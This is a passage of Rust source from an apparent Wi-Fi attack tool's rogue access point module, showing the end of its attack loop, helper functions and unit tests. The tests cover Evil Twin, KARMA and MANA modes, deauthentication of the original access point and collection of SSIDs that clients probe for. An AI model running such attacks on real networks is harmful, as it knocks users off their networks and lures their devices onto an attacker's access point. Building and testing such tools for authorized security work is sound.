            i.clients = sorted_clients.iter()
                .take(MAX_DISPLAY_CLIENTS)
                .cloned()
                .cloned()
                .collect();

            // KARMA SSIDs snapshot
            let karma_start = karma_ssids.len().saturating_sub(MAX_DISPLAY_KARMA_SSIDS);
            i.karma_ssids = karma_ssids[karma_start..].to_vec();

            let secs = i.elapsed.as_secs_f64();
            if secs > 0.0 {
                i.frames_per_sec = frames_sent as f64 / secs;
            }
            i.tx_feedback = tx_fb.snapshot();
        }
    }

    // === Cleanup ===
    let final_elapsed = start.elapsed();
    push_event(events, start, ApEventKind::AttackComplete {
        clients_total: clients.len() as u32,
        karma_ssids: karma_ssids.len() as u32,
        elapsed: final_elapsed,
    });
    shared.unlock_channel();
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Helper functions
// ═══════════════════════════════════════════════════════════════════════════════

/// Get or create a client entry. Returns Some(()) if the client was found/created.
fn get_or_create_client(
    clients: &mut HashMap<[u8; 6], ApClient>,
    mac: &MacAddress,
    max_clients: u32,
    elapsed: Duration,
    rssi: i8,
) -> Option<()> {
    let key = mac.0;

    if clients.contains_key(&key) {
        let c = clients.get_mut(&key).unwrap();
        c.rssi = rssi;
        c.last_seen = elapsed;
        return Some(());
    }

    if clients.len() as u32 >= max_clients {
        return None;
    }

    clients.insert(key, ApClient {
        mac: *mac,
        state: ClientApState::Probed,
        rssi,
        aid: 0,
        probe_ssid: String::new(),
        probe_count: 0,
        auth_count: 0,
        assoc_count: 0,
        data_frames_rx: 0,
        bytes_rx: 0,
        first_seen: elapsed,
        last_seen: elapsed,
    });
    Some(())
}

/// Extract SSID from a probe request's IEs.
fn extract_ssid_from_probe(frame_data: &[u8]) -> String {
    if frame_data.len() < 26 { return String::new(); }
    let ies = &frame_data[24..];
    if ies.len() < 2 || ies[0] != 0 { return String::new(); }
    let ssid_len = ies[1] as usize;
    if ssid_len == 0 { return String::new(); } // broadcast
    if ies.len() < 2 + ssid_len { return String::new(); }
    String::from_utf8_lossy(&ies[2..2 + ssid_len]).into_owned()
}

/// Push an event with auto-incrementing seq and timestamp.
fn push_event(events: &Arc<EventRing<ApEvent>>, start: Instant, kind: ApEventKind) {
    let seq = events.seq() + 1;
    events.push(ApEvent {
        seq,
        timestamp: start.elapsed(),
        kind,
    });
}

/// Update attack phase.
fn set_phase(info: &Arc<Mutex<ApInfo>>, phase: ApPhase) {
    let mut i = info.lock().unwrap_or_else(|e| e.into_inner());
    i.phase = phase;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  Tests
// ═══════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    // ── Params defaults ──

    #[test]
    fn test_params_default() {
        let p = ApParams::default();
        assert_eq!(p.mode, ApMode::EvilTwin);
        assert_eq!(p.beacon_interval, 100);
        assert!(p.deauth_original);
        assert_eq!(p.deauth_count, 5);
        assert_eq!(p.deauth_interval, Duration::from_millis(500));
        assert_eq!(p.timeout, Duration::ZERO);
        assert_eq!(p.max_clients, 128);
        assert_eq!(p.max_karma_ssids, 256);
        assert_eq!(p.security, ApSecurity::Open);
        assert!(p.ssid.is_none());
        assert!(p.our_bssid.is_none());
        assert!(p.beacon_list.is_empty());
    }

    // ── Mode properties ──

    #[test]
    fn test_mode_names() {
        assert_eq!(ApMode::EvilTwin.name(), "Evil Twin");
        assert_eq!(ApMode::EvilTwin.short_name(), "evil-twin");
        assert_eq!(ApMode::Karma.name(), "KARMA");
        assert_eq!(ApMode::Karma.short_name(), "karma");
        assert_eq!(ApMode::ManaLoud.name(), "MANA Loud");
        assert_eq!(ApMode::ManaLoud.short_name(), "mana");
        assert_eq!(ApMode::KnownBeacons.name(), "Known Beacons");
        assert_eq!(ApMode::KnownBeacons.short_name(), "known-beacons");
        assert_eq!(ApMode::Normal.name(), "Normal");
    }

    #[test]
    fn test_mode_karma() {
        assert!(ApMode::Karma.is_karma_mode());
        assert!(ApMode::ManaLoud.is_karma_mode());
        assert!(!ApMode::Normal.is_karma_mode());
        assert!(!ApMode::EvilTwin.is_karma_mode());
        assert!(!ApMode::KnownBeacons.is_karma_mode());
    }

    #[test]
    fn test_mode_deauth() {
        assert!(ApMode::EvilTwin.deauths_original());
        assert!(!ApMode::Normal.deauths_original());
        assert!(!ApMode::Karma.deauths_original());
        assert!(!ApMode::ManaLoud.deauths_original());
        assert!(!ApMode::KnownBeacons.deauths_original());
    }

    // ── Phase/state defaults ──

    #[test]
    fn test_phase_default() {
        assert_eq!(ApPhase::default(), ApPhase::Idle);
    }

    // ── Info defaults ──

    #[test]
    fn test_info_default() {
        let info = ApInfo::default();
        assert_eq!(info.phase, ApPhase::Idle);
        assert!(!info.running);
        assert_eq!(info.clients_total, 0);
        assert_eq!(info.clients_connected, 0);
        assert_eq!(info.beacons_sent, 0);
        assert_eq!(info.frames_sent, 0);
        assert_eq!(info.karma_ssids_collected, 0);
        assert!(info.ssid.is_empty());
    }

    // ── SSID extraction ──

    #[test]
    fn test_extract_ssid_from_probe_normal() {
        let mut frame = vec![0u8; 24];
        frame.push(0x00); // SSID tag
        frame.push(0x07); // length
        frame.extend_from_slice(b"CorpNet");
        assert_eq!(extract_ssid_from_probe(&frame), "CorpNet");
    }

    #[test]
    fn test_extract_ssid_from_probe_broadcast() {
        let mut frame = vec![0u8; 24];
        frame.push(0x00);
        frame.push(0x00); // empty = broadcast
        assert_eq!(extract_ssid_from_probe(&frame), "");
    }

    #[test]
    fn test_extract_ssid_from_probe_too_short() {
        let frame = vec![0u8; 20];
        assert_eq!(extract_ssid_from_probe(&frame), "");
    }

    // ── Client tracking ──

    #[test]
    fn test_get_or_create_client_new() {
        let mut clients = HashMap::new();
        let mac = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let result = get_or_create_client(&mut clients, &mac, 128, Duration::from_secs(1), -45);
        assert!(result.is_some());
        assert_eq!(clients.len(), 1);
        let key = mac.0;
        let c = &clients[&key];
        assert_eq!(c.rssi, -45);
        assert_eq!(c.state, ClientApState::Probed);
        assert_eq!(c.probe_count, 0);
    }

    #[test]
    fn test_get_or_create_client_existing() {
        let mut clients = HashMap::new();
        let mac = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        get_or_create_client(&mut clients, &mac, 128, Duration::from_secs(1), -45);
        get_or_create_client(&mut clients, &mac, 128, Duration::from_secs(2), -30);
        assert_eq!(clients.len(), 1);
        let key = mac.0;
        assert_eq!(clients[&key].rssi, -30);
        assert_eq!(clients[&key].last_seen, Duration::from_secs(2));
    }

    #[test]
    fn test_get_or_create_client_max_reached() {
        let mut clients = HashMap::new();
        let mac1 = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x01]);
        let mac2 = MacAddress::new([0x11, 0x22, 0x33, 0x44, 0x55, 0x02]);
        get_or_create_client(&mut clients, &mac1, 1, Duration::ZERO, -40);
        let result = get_or_create_client(&mut clients, &mac2, 1, Duration::ZERO, -50);
        assert!(result.is_none());
        assert_eq!(clients.len(), 1);
    }

    // ── ApAttack struct ──

    #[test]
    fn test_ap_attack_new() {
        let attack = ApAttack::new(ApParams::default());
        assert!(!attack.is_done());
        assert!(!attack.is_running());
        assert_eq!(attack.name(), "ap");
        let info = attack.info();
        assert_eq!(info.phase, ApPhase::Idle);
        assert!(!info.running);
    }

    #[test]
    fn test_ap_attack_events_empty() {
        let attack = ApAttack::new(ApParams::default());
        let events = attack.events();
        assert!(events.is_empty());
    }

    // ── Event ring ──

    #[test]
    fn test_event_ring_push_drain() {
        let ring = EventRing::<ApEvent>::new(16);
        ring.push(ApEvent {
            seq: 1,
            timestamp: Duration::from_millis(100),
            kind: ApEventKind::ChannelLocked { channel: 6 },
        });
        ring.push(ApEvent {
            seq: 2,
            timestamp: Duration::from_millis(200),
            kind: ApEventKind::AttackComplete {
                clients_total: 3,
                karma_ssids: 7,
                elapsed: Duration::from_secs(60),
            },
        });
        let events = ring.drain();
        assert_eq!(events.len(), 2);
    }

    // ── Event kind debug coverage ──

    #[test]
    fn test_event_kind_debug() {
        let kinds = vec![
            ApEventKind::ChannelLocked { channel: 6 },
            ApEventKind::ApStarted { bssid: MacAddress::ZERO, ssid: "Test".into(), mode: ApMode::Karma },
            ApEventKind::ProbeRequest { mac: MacAddress::ZERO, ssid: "Home".into(), rssi: -50 },
            ApEventKind::ProbeResponse { mac: MacAddress::ZERO, ssid: "Home".into() },
            ApEventKind::KarmaSsidCollected { ssid: "Corp".into(), mac: MacAddress::ZERO, total: 5 },
            ApEventKind::ClientAuthenticated { mac: MacAddress::ZERO, rssi: -40 },
            ApEventKind::ClientAssociated { mac: MacAddress::ZERO, aid: 1, rssi: -45 },
            ApEventKind::ClientReassociated { mac: MacAddress::ZERO, aid: 1 },
            ApEventKind::ClientDisconnected { mac: MacAddress::ZERO, reason: 7 },
            ApEventKind::DeauthBurst { target_bssid: MacAddress::ZERO, count: 5 },
            ApEventKind::DataFrameReceived { mac: MacAddress::ZERO, bytes: 1500 },
            ApEventKind::TimeoutReached { elapsed: Duration::from_secs(60) },
            ApEventKind::AttackComplete { clients_total: 3, karma_ssids: 12, elapsed: Duration::from_secs(120) },
            ApEventKind::Error { message: "test".into() },
        ];
        for kind in &kinds {
            let _ = format!("{:?}", kind);
        }
    }

    // ── Display impls ──

    #[test]
    fn test_mode_display() {
        assert_eq!(format!("{}", ApMode::EvilTwin), "Evil Twin");
        assert_eq!(format!("{}", ApMode::Karma), "KARMA");
    }
}
